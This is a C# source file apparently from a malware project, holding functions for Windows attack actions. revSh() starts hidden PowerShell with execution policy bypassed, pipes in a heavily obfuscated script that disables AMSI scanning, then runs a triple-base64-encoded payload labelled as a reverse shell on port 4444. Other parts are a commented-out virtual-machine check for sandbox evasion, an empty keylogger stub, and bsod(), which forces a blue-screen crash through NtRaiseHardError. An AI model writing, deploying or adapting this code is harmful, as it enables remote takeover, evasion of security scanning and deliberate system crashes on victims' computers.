using System.Diagnostics;
using System.Runtime.InteropServices;
using mw.utils;
using System;


namespace mw.funcs
{
	public class functions
	{
        //creates a reverse shell on port 4444
		public static void revSh()
		{
			using (Process p = new Process()) {
                p.StartInfo.FileName = base64.decode("cG93") + base64.decode("ZXJzaGVs") + base64.decode("bC5leGU=");
                p.StartInfo.Arguments = "-ep bypass -noprofile -W hidden";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.CreateNoWindow = true;
                AllocConsole();
                p.Start();
                p.StandardInput.WriteLine(".(\"{0}{1}\"-f's','Et') (\"Seu\"+\"c\")  (  [TYpE](\"{2}{0}{4}{1}{3}\" -F 'a','.thr','Thre','Ead','dinG') )  ;    .('sv')  5bwL (  [TYPe](\"{0}{1}\" -F're','F')  );${MG`X`yKs}=${n`ULl};${KJf`OkB`IkN}=\"$(('Sy'+'st'+'em').NOrMaLIzE([chaR](68+2)+[CHAr](111)+[cHar](114+111-111)+[chAR](61+48)+[CHAR]([byTE]0x44)) -replace [char]([byTe]0x5c)+[ChAR](112+22-22)+[chAR]([byTe]0x7b)+[chAr](77*8/8)+[cHaR]([BytE]0x6e)+[chAR](60+65)).$([ChAR]([BYTE]0x4d)+[cHAr]([byte]0x61)+[CHAR]([bYTe]0x6e)+[cHAr]([Byte]0x61)+[chaR]([byTE]0x67)+[cHaR]([ByTe]0x65)+[char](24+85)+[cHAr]([bYte]0x65)+[cHar]([bYte]0x6e)+[chAr]([BYte]0x74)).$(('Âutõm'+'ãtíôn').noRmAliZe([Char]([BytE]0x46)+[CHar](29+82)+[CHAr]([BYtE]0x72)+[cHaR]([BYTE]0x6d)+[ChaR](19+49)) -replace [CHAr](92+7-7)+[CHar](112*86/86)+[cHAR]([BytE]0x7b)+[CHAr](77)+[CHAR]([bYTe]0x6e)+[ChaR](125)).$(('ÁmsíU'+'tìls').NorMaLIZE([cHAR](63+7)+[chAr](111+39-39)+[cHAR](114*103/103)+[CHAR]([bYTE]0x6d)+[cHar]([BYtE]0x44)) -replace [CHar]([BYte]0x5c)+[cHAr]([byTe]0x70)+[char]([BYTe]0x7b)+[cHAR](17+60)+[CHAr]([BYte]0x6e)+[chAr]([ByTE]0x7d))\";${lGkE`snLm`mUib}=(((\"{21}{62}{53}{49}{39}{19}{56}{64}{20}{46}{11}{10}{12}{14}{30}{60}{7}{61}{3}{15}{16}{24}{54}{29}{41}{0}{58}{52}{17}{23}{36}{37}{31}{57}{25}{40}{18}{38}{63}{5}{48}{50}{47}{55}{45}{34}{35}{44}{8}{1}{51}{33}{9}{28}{59}{26}{4}{6}{43}{22}{42}{32}{2}{13}{27}\"-f'1','TE','(','E]0x6f)+[chAr]([bYte','46','E]','-4','([B','Y','7b','([cHAr](','E','70)+[c','12','H',']0x72)+','[','AR]','ar]([B','nSsL)','li','+(','+[','(65+3','CHaR](10',' [c','aR](77+','5*55/55)',')','+81-','ar','epl','R]','0x','+47)+[C','H','))',' -r','y','sL','h','8','char](64+46)+[ChA','6)','Ar]([b','5','Z',']','0x5c)+[ch','S','Ar',']','ch','L+','9','(6','.no','ace',')+[','+[cH',']','yT','SsLwSs','T','rMA')).\"rEPl`ACe\"(([cHAr]83+[cHAr]115+[cHAr]76),[StRiNg][cHAr]39));  (&(\"{0}{2}{1}\"-f'GET-Vari','le','aB')  (\"seU\"+\"c\")  -VaLueOn)::(\"{1}{0}\"-f 'eep','Sl').Invoke(1247); ( &(\"{0}{2}{1}\"-f'vAR','BLe','Ia') 5bwl -Va  ).\"A`sSEmBLy\".(\"{0}{1}\"-f 'GetT','ype').Invoke(${K`jFO`kbiKN}).\"geTf`IElD\"($([chAR]([bYtE]0x61)+[Char]([byte]0x6d)+[cHAr](115+10-10)+[Char]([BYte]0x69)+[cHAr]([bytE]0x49)+[cHAr](110*35/35)+[Char]([bYtE]0x69)+[cHAR]([byTE]0x74)+[ChAR](70*56/56)+[char](97)+[char]([ByTE]0x69)+[CHar](108+36-36)+[chaR](89+12)+[chaR](100)),(\"{1}{2}{3}{0}\" -f ',Static','No','nP','ublic')).(\"{2}{0}{1}\" -f'Valu','e','Set').Invoke(${MGx`Y`ks},${T`Rue}); ");
                p.StandardInput.WriteLine(base64.decode(base64.decode(base64.decode("U2tkT2MyRlhWblZrUTBFNVNVVTFiR1I1TVZCWmJYQnNXVE5SWjFVemJIcGtSMVowVEdzMWJHUkROVlJpTWs1eVdsaFNla3hzVWtSVlJVNXpZVmRXZFdSRFoybFBWR3QxVG5wQmRVOVVRWFZOVkdjMFNXbDNNRTVFVVRCTFZITnJZek5TZVZwWFJuUkpSREJuU2tkT2MyRlhWblZrUXpWSVdsaFNWR1JJU214WlZ6QnZTMVIwWWxsdWJEQmFWblJrV0ZOU2FXVllVbXhqZVVFNVNVUkJkVXhxV1RGT1ZFMHhaa05XTjAxSU1EZGtNbWh3WWtkVmIwdERVbkJKUkRCblNraE9NR050Vm1oaVV6VlRXbGRHYTB0RFVtbGxXRkpzWTNsM1owMURkMmRLUjBvMVpFZFdla3hyZUd4aWJXUXdZVU5yY0VsRE1YVmFVMEYzUzFoek4wcEhVbWhrUjBWblVGTkJiMVJ0VmpOTVZUbHBZVzFXYW1SRFFYUldTR3gzV2xVMWFHSlhWV2RWTTJ4NlpFZFdkRXhzVW14bFNGRjFVVlpPUkZOVmJFWmliVTUyV2tkc2RWcDVhM1ZTTWxZd1ZUTlNlV0ZYTlc1TFExSnBaVmhTYkdONWQzZE1RMEZyWVZOck4wcElUbXhpYlZKcFdWZE9ja2xFTUdkTFIyeHNaVU5CYTFwSFJqQlpVMEY1VUdsWmVFbElkMmRVTTFZd1RGWk9NR050YkhWYWVVRndUM2xTZWxwWE5XdFpiVVpxWVhwSloxQlRRV3RqTWxaMVdrZEthRmt5YzJkTGVVRnBWVVpOWjBscFFYSkpRMmgzWkRKUmNFeHNRbWhrUjJkblMzbEJhVkJwUVdsUGVWSjZXbGMxYTFsdWJEQmFVMEU1U1VOb1ltUkhWalJrUXpWc1ltMU9kbHBIYkhWYU1UQTJUMnRHVkZFd2JFcExVelZJV2xoU1EyVllVbXhqZVdkcll6SldkVnBIU21oWk1uTjVTMVJ6YTJNelVubGFWMFowVEd4a2VXRllVbXhMUTFKNldsYzFhMWx1YkRCYVUzZDNURU5TZWxwWE5XdFpibXd3V2xNMVRWcFhOVzVrUjJkd1QzbFNlbVJJU214WlZ6QjFVbTE0TVdNeVoyOUxXREEzU2tkT2MyRlhWblZrUXpWRVlrYzVlbHBUWjNBPQ=="))));
                p.StandardInput.Close();
                FreeConsole();
                p.WaitForExit();
            }			
		}
        /* uncomment if you want to check if running in Virtual machine
        public static bool isVM() {
            using (Process p = new Process()) {
                p.StartInfo.FileName = base64.decode("cG93") + base64.decode("ZXJzaGVs") + base64.decode("bC5leGU=");
                p.StartInfo.Arguments = "-ep bypass -noprofile -W hidden /K \"Get-WmiObject -Query 'Select * from Win32_CacheMemory'\"";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                if(output.Length > 0) return true;
                return false;
            }
        }
        */
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void keylogger() {
            //to do: make work
        }


        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        //blue screen
        public static void bsod()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        [DllImport("kernel32.dll")]
        public static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();


	}
}